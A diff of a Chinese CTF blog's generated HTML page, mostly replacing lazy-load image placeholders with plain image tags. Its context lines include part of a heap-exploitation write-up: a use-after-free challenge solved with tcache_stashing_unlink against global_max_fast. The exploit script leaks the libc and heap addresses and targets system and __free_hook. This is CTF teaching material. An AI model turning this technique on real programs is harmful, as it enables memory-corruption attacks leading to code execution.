@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -613,9 +613,9 @@
 <p>利用手法2：</p>
 <p>这里我们用一个例题来说明。</p>
 <p>首先大小被限制在0x90~0x200之间。</p>
-<p><img src="/.io//image-20211007171728126.png" class="lazyload placeholder" data-srcset="/.io//image-20211007171728126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211007171728126"></p>
+<p><img src="https://img.le1a.com/2023/02/07/7046d7e6696eb.png" alt="image-20211007171728126"></p>
 <p>漏洞点在于free后没有置0</p>
-<p><img src="/.io//image-20211007171820784.png" class="lazyload placeholder" data-srcset="/.io//image-20211007171820784.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211007171820784"></p>
+<p><img src="https://img.le1a.com/2023/02/07/289d4098b6530.png" alt="image-20211007171820784"></p>
 <p>这个题需要我们先利用tcache_stashing_unlink去打global_max_fast,因为我们只需要改变global_max_fast的值所以在这我们就将tcache填入6个，smallbin填入两个，执行一次将smallbin中的chunk放入tcache中的操作，就可以将global_max_fast的值改为main_arena的值。</p>
 <p>exp如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">for i in range(4):</span><br><span class="line">	add(0x1f8)#0~3</span><br><span class="line">for i in range(2):</span><br><span class="line">	add(0xe8)#4~5</span><br><span class="line">for i in range(6):</span><br><span class="line">	dele(4)</span><br><span class="line">	edit(4,&#x27;\x00&#x27;*0x10)</span><br><span class="line">for i in range(7):</span><br><span class="line">	dele(3)</span><br><span class="line">	edit(3,&#x27;\x00&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">dele(2)</span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">libc_base=u64(io.recv(6)+&#x27;\x00\x00&#x27;)-libc.symbols[&#x27;__malloc_hook&#x27;]-96-16</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">global_max_fast=libc_base+0x1eeb80</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))+0x110</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x108)#6</span><br><span class="line">add(0x108)#7</span><br><span class="line">add(0x108)#8</span><br><span class="line">edit(2,&#x27;\x00&#x27;*0x108+p64(0xf1)+p64(heap_base)+p64(libc_base+0x1eeb80-0x10))</span><br><span class="line">add(0xe8)#9</span><br></pre></td></tr></table></figure>
@@ -667,7 +667,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/3.jpg" class="lazyload placeholder" data-srcset="/medias/3.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/3.jpg" alt="">
     </div>
     <a href="/2021/10/14/chang-cheng-bei-final/" class="post-nav-link">
       <div class="title">
@@ -690,7 +690,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/4.jpg" class="lazyload placeholder" data-srcset="/medias/4.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/4.jpg" src="" alt="">
     </div>
     <a href="/2021/09/19/chang-cheng-bei/" class="post-nav-link">
       <div class="title">
@@ -745,10 +745,10 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -959,7 +959,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -980,7 +980,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1001,7 +1001,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1022,7 +1022,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1043,7 +1043,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
